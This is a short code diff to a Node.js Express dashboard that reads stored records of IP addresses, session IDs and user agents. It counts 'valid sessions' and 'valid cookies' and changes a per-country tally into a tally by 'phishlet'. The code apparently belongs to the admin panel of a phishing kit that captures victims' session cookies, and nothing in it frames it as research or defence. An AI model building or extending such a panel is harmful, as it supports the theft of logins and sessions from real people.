@@ -45,7 +45,7 @@ let countryCount = {};
 
 app.get('/', checkAuthenticated, async (req, res) => {
     // Reset countryCount to start fresh on each request
-    //countryCount = {};
+    countryCount = {};
 
     await fs.readFile('data.db', 'UTF-8', (err, file) => {
         if (err) {
@@ -65,22 +65,10 @@ app.get('/', checkAuthenticated, async (req, res) => {
             const validSessions = data.filter(user => user.session_id !== '' && user.session_id !== undefined);
             const validCookies = data.filter(user => user.useragent !== '' && user.useragent !== undefined);
 
-
             //country wise ip count
             data.map(async item => {
-                const {remote_addr} = item;
-
-                const response = await axios.get(`http://ip-api.com/json/${remote_addr}`);
-                const ipData = response.data;
-
-                if (ipData.country) {
-                    const str = ipData.country;
-                    const countryCode = ipData.countryCode;
-                    const country = str.replace(/ /g, '');
-                    // Push IP and country to the array
-                    //ipCountryData.push({remote_addr, country, countryCode});
-                    // Count occurrences of each country
-                    const key = countryCode + '|' + country;
+                if (item.phishlet) {
+                    const key = item.phishlet;
                     if (countryCount[key]) {
                         countryCount[key] += 1;
                     } else {
